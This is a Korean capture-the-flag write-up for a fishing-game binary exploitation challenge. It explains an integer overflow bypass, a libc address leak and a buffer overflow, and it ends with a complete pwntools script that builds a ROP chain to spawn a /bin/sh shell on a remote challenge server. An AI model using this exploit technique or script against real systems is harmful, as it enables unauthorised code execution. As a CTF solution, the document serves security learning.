```C
# in main()
if ( fishing_attempts == 20 && !large_fish )
      mermaid();
```
mermaid 함수에서 돈을 많이 주므로 이를 실행시켜보자.

fishing_attempts는 go_fishing을 할 때마다 1씩 증가하므로 20번 실행하면 된다.
large_fish는 shop에서 팔면 0이 되므로 다 팔아주자. 이 때 받은 돈을 기억하자. 이를 `gave_money`라 하자.

```C
__int64 mermaid()
{
  __int64 result; // rax
  int v1; // [rsp+8h] [rbp-8h] BYREF
  __int16 v2; // [rsp+Eh] [rbp-2h]

  result = (unsigned int)wish;
  if ( !wish )
  {
    puts("You found a mermaid!");
    puts("Enter Your wish: ");
    __isoc99_scanf("%u", &v1);
    v2 = v1 + money;
    if ( (__int16)(v1 + money) > 0 )
    {
      puts("The mermaid rejected your wish....");
      exit(0);
    }
    puts("The mermaid make a wish come true....!!!");
    money += 10000;
    printf("Your money is now: %u\n", (unsigned __int16)money);
    return (unsigned int)++wish;
  }
  return result;
}
```
if 조건문을 통과해야 한다. money가 \_\_int16 인 것을 알고 있으므로 65536 - `gave_money`를 입력하면 if에 걸리지 않고 money를 늘릴 수 있다.

```C
# in shop()
else
    {
      printf("buy the luxury bait!! %p\n", &printf);
      return ++bait;
    }
```
돈이 충분하면 printf 주소를 출력해주므로 libc_base를 얻을 수 있다.

```C
int exit_game()
{
  char buf[64]; // [rsp+0h] [rbp-40h] BYREF

  puts("Let's quit the game..");
  read(0, buf, 0x78uLL);
  return puts("\nGood Bye!!!");
}
```
exit_game에서 bof가 발생한다. 쉘 따는 ROP를 수행해주면 된다.

# Exploit code

```python
from pwn import *

p = remote('44.210.9.208', 10017)
# p = process('./challenge')
l = ELF('./libc.so.6')

for _ in range(20):
    p.sendlineafter(b'choose: ', b'1')

p.sendlineafter(b'choose: ', b'3')
p.sendlineafter(b'choose: ', b'2')
p.sendlineafter(b'choose: ', b'1')
p.recvline()
money = int(p.recvline().split()[-2])
left = 65536 - money
print(f"money = {money}")
print(f"left = {left}")

p.sendlineafter(b'Enter Your wish: ', str(left).encode())

p.sendlineafter(b'choose: ', b'3')
p.sendlineafter(b'choose: ', b'1')
p.recvline()
l.address = int(p.recvline().split()[-1].decode(), 16) - l.sym['printf']
print(hex(l.address))

ret = 0x000000000040101a
system = l.sym['system']
binsh = list(l.search(b'/bin/sh'))[0]
pop_rdi = l.address + 0x0000000000023b6a

p.sendlineafter(b'choose: ', b'4')
payload = b'a' * 0x40 + b'b' * 8 + p64(ret) + p64(pop_rdi) + p64(binsh) + p64(system)
p.sendafter(b'quit the game..', payload)

p.interactive()
```
`scpCTF{You_4r3_K1n&_0F_FiSh1nG!}`